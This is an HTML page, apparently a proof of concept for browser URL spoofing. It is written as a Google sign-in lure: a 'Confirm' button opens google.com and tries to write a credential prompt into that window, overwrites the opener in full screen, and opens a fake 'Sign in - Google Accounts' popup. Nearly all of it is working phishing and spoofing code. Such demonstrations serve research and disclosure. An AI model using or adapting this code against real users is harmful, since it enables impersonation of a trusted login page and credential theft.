<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>URL Spoofing</title>

    <style>
        #button {
            width: 150px;
            height: 35px;
        }
    </style>

    <script>
        function spoof() {
            // HTML untuk halaman opener (full-screen)
            const openerHTML = `
                <html>
                <head>
                    <style>
                        body { margin: 0; padding: 0; }
                        #content { width: 100%; height: 100%; }
                    </style>
                </head>
                <body>
                    <img id="content" src="spoof.png">
                </body>
                </html>
            `;

            // HTML untuk popup phishing login
            const popupHTML = `
                <html>
                <head>
                    <title>Sign in - Google Accounts</title>
                    <style>
                        body { margin: 0; padding: 0; }
                        #content { width: 100%; height: 100%; }
                    </style>
                </head>
                <body>
                    <img id="content" src="sign.png">
                </body>
                </html>
            `;

            // ============ POPUP SPOOF =============
            let win = window.open("https://www.google.com/", "_blank");

            setTimeout(() => {
                try {
                    win.document.write(`
                        <h1>This is not Google!</h1>
                        <button onclick="
                            let username = prompt('Enter your username');
                            let password = prompt('Enter your password');
                            alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
                        ">Click me</button>
                    `);
                    win.document.close();
                } catch (e) {
                    console.warn("Browser blocked write():", e);
                }
            }, 50);

            // ============ OVERWRITE OPENER ============
            try {
                window.opener.document.documentElement.webkitRequestFullscreen();
                window.opener.document.write(openerHTML);
            } catch (e) {
                console.warn("Opener blocked:", e);
            }

            // ============ POPUP LOGIN PALSU =============
            let width = 500, height = 460;
            let left = (screen.width / 2) - (width / 2);
            let popup = window.open("about:blank", "second",
                `width=${width},height=${height},top=0,left=${left}`);

            try {
                popup.document.write(popupHTML);
                popup.document.close();
            } catch (e) {
                console.warn("Popup blocked:", e);
            }

            window.close();
        }
    </script>
</head>

<body>
    <center>
        <br>
        <h1>
            Please confirm you want to signin into your Google Account<br><br>
            <button id="button" onclick="spoof();">Confirm</button>
        </h1>
    </center>
</body>
</html>
